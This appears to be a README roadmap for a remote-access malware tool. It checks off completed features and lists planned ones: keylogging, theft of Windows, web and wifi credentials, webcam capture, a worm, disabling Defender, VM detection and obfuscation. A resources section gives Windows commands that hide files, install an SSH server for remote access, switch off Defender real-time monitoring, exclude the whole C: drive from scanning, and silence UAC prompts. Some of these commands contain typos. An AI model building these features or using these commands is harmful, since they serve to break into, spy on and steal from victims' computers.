# Roadmap:
Target Build:
- [x] staging
- [x] remote access
- [x] config file builder [.? extension]

Attacker Build:
- [x] console build [python3]
- [x] update

Installers:
- [ ] listener option
- [ ] USB RubberDucky
- [ ] BashBunny
- [ ] shortcutting

Modules | Payloads:
- [x] remote console
- [ ] reconnaissance scan
	- web history
	- computer info
- [ ] escalation
	- windows account
	- web credentials
	- wifi credentials
- [ ] destroy defender
	- firewall
- [ ] keylogger
	- backspace detection
- [ ] screenshots
- [ ] webcam
- [ ] exfiltration
	- scp
- [ ] file upload
- [ ] worm
	- vbs special 
- [ ] custom desktop shortcuts
- [ ] adware
- [ ] killswitch
- [ ] break pc | bsod
- [ ] payload builder

Extraneous:	
- [ ] port forwarding
- [ ] vm detection
- [ ] obfuscation
- [ ] exploit for non priv users

# Resources:

## show/hide files
```
# show files
attrib -h -s -r FILE

# hide file
attrib +h +s +r FILE
```

## ssh
```
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*
```

## exclusion path
```
Set-MpPreference -DisableRealtimeMonitoring true
Add-MpPreference -ExclusionPatch c:\
Add-MpPreference -EsclusionProcess c:\windows\system32\cmd.exe
```

## disable uac
```powershell
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
```
